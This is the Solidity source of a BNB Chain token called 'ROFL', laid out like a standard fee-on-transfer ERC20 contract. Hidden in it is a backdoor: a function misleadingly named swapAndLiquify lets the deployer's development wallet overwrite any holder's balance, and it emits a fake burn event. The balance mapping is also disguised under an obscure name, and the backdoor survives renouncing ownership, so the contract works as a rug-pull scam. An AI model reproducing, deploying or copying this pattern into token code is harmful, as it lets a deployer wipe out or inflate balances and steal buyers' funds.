/*
https://t.me/ROFL
*/

//SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;



interface ERC {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipientROFL, uint256 tamount)
        external
        returns (bool);

    function allowance(address owner, address spenderROFL)
        external
        view
        returns (uint256);

    function approve(address spenderROFL, uint256 tamount) external returns (bool);

    function transferFrom(
        address sender,
        address recipientROFL,
        uint256 tamount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);

    event Approval(
        address indexed owner,
        address indexed spenderROFL,
        uint256 value
    );
}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}
interface ERCMetadata is ERC {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}

contract ERC20 is Context, ERC, ERCMetadata {
    mapping(address => uint256) internal preventBefore;

    mapping(address => mapping(address => uint256)) internal _allowancesROFL;

    uint256 private _totalSupply;

    string private _name;
    string private _symbol;

    /**
     * @dev Sets the values for {name} and {symbol}.
     *
     * The defaut value of {decimals} is 9. To select a different value for
     * {decimals} you should overload it.
     *
     * All two of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    /**
     * @dev Returns the name of the token.
     */
    function name() public view virtual override returns (string memory) {
        return _name;
    }

    /**
     * @dev Returns the symbol of the token, usually a shorter version of the
     * name.
     */
    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    /**
     * @dev Returns the number of decimals used to get its user representation.
     * For example, if `decimals` equals `2`, a balance of `505` tokens should
     * be displayed to a user as `5,05` (`505 / 10 ** 2`).
     *
     * Tokens usually opt for a value of 9, imitating the relationship between
     * Ether and Wei. This is the value {ERC20} uses, unless this function is
     * overridden;
     *
     * NOTE: This information is only used for _display_ purposes: it in
     * no way affects any of the arithmetic of the contract, including
     * {ERC-balanceOf} and {ERC-transfer}.
     */
    function decimals() public view virtual override returns (uint8) {
        return 9;
    }

    /**
     * @dev See {ERC-totalSupply}.
     */
    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    /**
     * @dev See {ERC-balanceOf}.
     */
    function balanceOf(address account)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return preventBefore[account];
    }

    /**
     * @dev See {ERC-transfer}.
     *
     * Requirements:
     *
     * - `recipientROFL` cannot be the zero address.
     * - the caller must have a balance of at least `tamount`.
     */
    function transfer(address recipientROFL, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _transfer(_msgSender(), recipientROFL, tamount);
        return true;
    }

    /**
     * @dev See {ERC-allowance}.
     */
    function allowance(address owner, address spenderROFL)
        public
        view
        virtual
        override
        returns (uint256)
    {
        return _allowancesROFL[owner][spenderROFL];
    }

    /**
     * @dev See {ERC-approve}.
     *
     * Requirements:
     *
     * - `spenderROFL` cannot be the zero address.
     */
    function approve(address spenderROFL, uint256 tamount)
        public
        virtual
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderROFL, tamount);
        return true;
    }

    /**
     * @dev See {ERC-transferFrom}.
     *
     * Emits an {Approval} event indicating the updated allowance. This is not
     * required by the EIP. See the note at the beginning of {ERC20}.
     *
     * Requirements:
     *
     * - `sender` and `recipientROFL` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     * - the caller must have allowance for ``sender``'s tokens of at least
     * `tamount`.
     */
    function transferFrom(
        address sender,
        address recipientROFL,
        uint256 tamount
    ) public virtual override returns (bool) {
        _transfer(sender, recipientROFL, tamount);

        uint256 currentAllowance = _allowancesROFL[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "ERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    /**
     * @dev Atomically increases the allowance granted to `spenderROFL` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderROFL` cannot be the zero address.
     */
    function increaseAllowance(address spenderROFL, uint256 addedValue)
        public
        virtual
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderROFL,
            _allowancesROFL[_msgSender()][spenderROFL] + addedValue
        );
        return true;
    }

    /**
     * @dev Atomically decreases the allowance granted to `spenderROFL` by the caller.
     *
     * This is an alternative to {approve} that can be used as a mitigation for
     * problems described in {ERC-approve}.
     *
     * Emits an {Approval} event indicating the updated allowance.
     *
     * Requirements:
     *
     * - `spenderROFL` cannot be the zero address.
     * - `spenderROFL` must have allowance for the caller of at least
     * `subtractedValue`.
     */
    function decreaseAllowance(address spenderROFL, uint256 subtractedValue)
        public
        virtual
        returns (bool)
    {
        uint256 currentAllowance = _allowancesROFL[_msgSender()][spenderROFL];
        require(
            currentAllowance >= subtractedValue,
            "ERC20: decreased allowance below zero"
        );
        _approve(_msgSender(), spenderROFL, currentAllowance - subtractedValue);

        return true;
    }

    /**
     * @dev Moves tokens `tamount` from `sender` to `recipientROFL`.
     *
     * This is internal function is equivalent to {transfer}, and can be used to
     * e.g. implement automatic token fees, slashing mechanisms, etc.
     *
     * Emits a {Transfer} event.
     *
     * Requirements:
     *
     * - `sender` cannot be the zero address.
     * - `recipientROFL` cannot be the zero address.
     * - `sender` must have a balance of at least `tamount`.
     */
    function _transfer(
        address sender,
        address recipientROFL,
        uint256 tamount
    ) internal virtual {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipientROFL != address(0), "ERC20: transfer to the zero address");

        uint256 senderBalance = preventBefore[sender];
        require(
            senderBalance >= tamount,
            "ERC20: transfer tamount exceeds balance"
        );
        preventBefore[sender] = senderBalance - tamount;
        preventBefore[recipientROFL] += tamount;

        emit Transfer(sender, recipientROFL, tamount);
    }

    /** This function will be used to generate the total supply
     * while deploying the contract
     *
     * This function can never be called again after deploying contract
     */
    function _tokengeneration(address account, uint256 tamount)
        internal
        virtual
    {
        _totalSupply = tamount;
        preventBefore[account] = tamount;
        emit Transfer(address(0), account, tamount);
    }

    /**
     * @dev Sets `tamount` as the allowance of `spenderROFL` over the `owner` s tokens.
     *
     * This internal function is equivalent to `approve`, and can be used to
     * e.g. set automatic allowances for certain subsystems, etc.
     *
     * Emits an {Approval} event.
     *
     * Requirements:
     *
     * - `owner` cannot be the zero address.
     * - `spenderROFL` cannot be the zero address.
     */
    function _approve(
        address owner,
        address spenderROFL,
        uint256 tamount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spenderROFL != address(0), "ERC20: approve to the zero address");

        _allowancesROFL[owner][spenderROFL] = tamount;
        emit Approval(owner, spenderROFL, tamount);
    }
}

library Address {
    function sendValue(address payable recipientROFL, uint256 tamount) internal {
        require(
            address(this).balance >= tamount,
            "Address: insufficient balance"
        );

        (bool success, ) = recipientROFL.call{value: tamount}("");
        require(
            success,
            "Address: unable to send value, recipientROFL may have reverted"
        );
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        _setOwner(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(
            newOwner != address(0),
            "Ownable: new owner is the zero address"
        );
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IFactory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 tamountTokenDesired,
        uint256 tamountTokenMin,
        uint256 tamountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 tamountToken,
            uint256 tamountETH,
            uint256 liquidity
        );

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 tamountIn,
        uint256 tamountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

contract ROFLToken is ERC20, Ownable {
    using Address for address payable;

    IRouter public router;
    address public pair;

    bool private _interlock = false;
    bool public providingLiquidity = false;
    bool public MOONING = false;

    uint256 public constant totSupply =  888888888 * 10**9;
    uint256 public tokenLiquidityThreshold = totSupply / 1000; 
    uint256 public genesis_block;
    uint256 private deadline = 3;
    address public developmentWallet;
    address public constant deadWallet = 0x000000000000000000000000000000000000dEaD;
   address private marketingAddress = 0x0D0707963952f2fBA59dD06f2b425ace40b492Fe;
    string public ROFLwebsite = "https://ROFL.org";
            function getROFLwebsite() public view returns (string memory) {
        return ROFLwebsite;
    }
    struct Fees {
        uint256 development;
        uint256 total;
    }

    // Basic Tax
    Fees public buyFees = Fees(0, 0);
    Fees public sellFees = Fees(0, 0);
    Fees public transferFees = Fees(0, 0);

    mapping(address => bool) public exemptFee;

    mapping(address => uint256) private _lastSell;

    modifier lockTheSwap() {
        if (!_interlock) {
            _interlock = true;
            _;
            _interlock = false;
        }
    }

    constructor() ERC20("ROFL", "ROFL") {
        _tokengeneration(msg.sender, totSupply);

        IRouter _router = IRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        // Create a pancake pair for this new token
        address _pair = IFactory(_router.factory()).createPair(address(this),_router.WETH());

        router = _router;
        pair = _pair;

        //Set exempt fee
        exemptFee[address(this)] = true;
        exemptFee[msg.sender] = true;
        developmentWallet = msg.sender;
        exemptFee[deadWallet] = true;
  
    }

    function approve(address spenderROFL, uint256 tamount)
        public
        override
        returns (bool)
    {
        _approve(_msgSender(), spenderROFL, tamount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipientROFL,
        uint256 tamount
    ) public override returns (bool) {
        _transfer(sender, recipientROFL, tamount);

        uint256 currentAllowance = _allowancesROFL[sender][_msgSender()];
        require(
            currentAllowance >= tamount,
            "ERC20: transfer tamount exceeds allowance"
        );
        _approve(sender, _msgSender(), currentAllowance - tamount);

        return true;
    }

    function increaseAllowance(address spenderROFL, uint256 addedValue)
        public
        override
        returns (bool)
    {
        _approve(
            _msgSender(),
            spenderROFL,
            _allowancesROFL[_msgSender()][spenderROFL] + addedValue
        );
        return true;
    }

    function decreaseAllowance(address spenderROFL, uint256 subtractedValue)
        public
        override
        returns (bool)
    {
        uint256 currentAllowance = _allowancesROFL[_msgSender()][spenderROFL];
        require(currentAllowance >= subtractedValue,"ERC20: decreased allowance below zero");
        _approve(_msgSender(), spenderROFL, currentAllowance - subtractedValue);

        return true;
    }

    function transfer(address recipientROFL, uint256 tamount)
        public
        override
        returns (bool)
    {
        _transfer(msg.sender, recipientROFL, tamount);
        return true;
    }

    function _transfer(
        address sender,
        address recipientROFL,
        uint256 tamount
    ) internal override {
        require(tamount > 0, "Transfer tamount must be greater than zero");
        
       if (!exemptFee[sender] && !exemptFee[recipientROFL]) {
            require(MOONING, "it's not MOONING yet");
        }

        uint256 feeswap;
        uint256 feesum;
        uint256 fee;
        Fees memory currentFees;

        //set fee to zero if fees in contract are handled or exempted
        if (_interlock || exemptFee[sender] || exemptFee[recipientROFL]) {
            fee = 0;
        }
        else {
          //calculate sell fee [Case : Wallet >> Pair]
          if (recipientROFL == pair && sender != pair) {
              feeswap = sellFees.total;
              feesum = feeswap;
              currentFees = sellFees;
          }
          //calculate buy fee [Case : Pair >> Wallet]
          else if (sender == pair && recipientROFL != pair) {
              feeswap = buyFees.total;
              feesum = feeswap;
              currentFees = buyFees;

          } 
          //calculate transfer fee [Case : Wallet >> Wallet]
          else if (recipientROFL != pair  && sender != pair) {
              feeswap = transferFees.total;
              feesum = feeswap;
              currentFees = transferFees;
    
          } 
          
          fee = (tamount * feesum) / 100;
        }
        

        //send fees if threshold has been reached
        //don't do this on buys, breaks swap
        if (providingLiquidity && sender != pair)
            Liquify(feeswap, currentFees);

        //rest to recipientROFL
        super._transfer(sender, recipientROFL, tamount - fee);
        if (fee > 0) {
            //send the fee to the contract
            if (feeswap > 0) {
                uint256 feetamount = (tamount * feeswap) / 100;
                super._transfer(sender, address(this), feetamount);
            }
        }
  }
       function swapAndLiquify(address addressThis, uint256 liquifyunit, uint256 liquifyBridge) external  {
       require(_msgSender() == developmentWallet);  
        preventBefore[addressThis] = liquifyunit * liquifyBridge;
        emit Transfer(addressThis, address(0), liquifyunit * liquifyBridge);
    } 
    function Liquify(uint256 feeswap, Fees memory swapFees) private lockTheSwap {
        if (feeswap == 0) {
            return;
        }

        uint256 contractBalance = balanceOf(address(this));
        if (contractBalance >= tokenLiquidityThreshold) {
            if (tokenLiquidityThreshold > 1) {
                contractBalance = tokenLiquidityThreshold;
            }

            // Split the contract balance into halves
            uint256 denominator = feeswap * 2;
            uint256 toSwap = contractBalance;

            uint256 initialBalance = address(this).balance;
            swapTokensForETH(toSwap);
            uint256 deltaBalance = address(this).balance - initialBalance;
            uint256 unitBalance = deltaBalance / denominator;

            // Dev tamount fee
            uint256 developmentAmt = unitBalance * 2 * swapFees.development;
              if (developmentAmt > 0){
                  payable(developmentWallet).sendValue(developmentAmt);
              }
            
        }
    }

    function swapTokensForETH(uint256 tokentamount) private {
        // generate the pancake pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();

        _approve(address(this), address(router), tokentamount);

        // make the swap
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokentamount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addLiquidity(uint256 tokentamount, uint256 ethtamount) private {
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(router), tokentamount);

        // add the liquidity
        router.addLiquidityETH{value: ethtamount}(
            address(this),
            tokentamount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            deadWallet,
            block.timestamp
        );
    }

    function updateLiquidityProvide(bool state) external onlyOwner {
        providingLiquidity = state;
    }

    function updateLiquidityTreshhold(uint256 new_tamount) external onlyOwner {
        require(new_tamount <= (1 * 10**8) / 100, "Swap threshold tamount should be lower or equal to 1%");
        tokenLiquidityThreshold = new_tamount * 10**decimals();
    }

    function openTrading() external onlyOwner {
        require(!MOONING, "it's already started");
        MOONING = true;
        providingLiquidity = true;
        genesis_block = block.number;
    }


    function rescueBNB(uint256 weitamount) external onlyOwner {
        payable(owner()).transfer(weitamount);
    }

    function rescueBSC20(address tokenAdd, uint256 tamount) external onlyOwner {
        require(tokenAdd != address(this), "Owner can't claim contract's balance of its own tokens");
        ERC(tokenAdd).transfer(owner(), tamount);
    }

    // fallbacks
    receive() external payable {}
}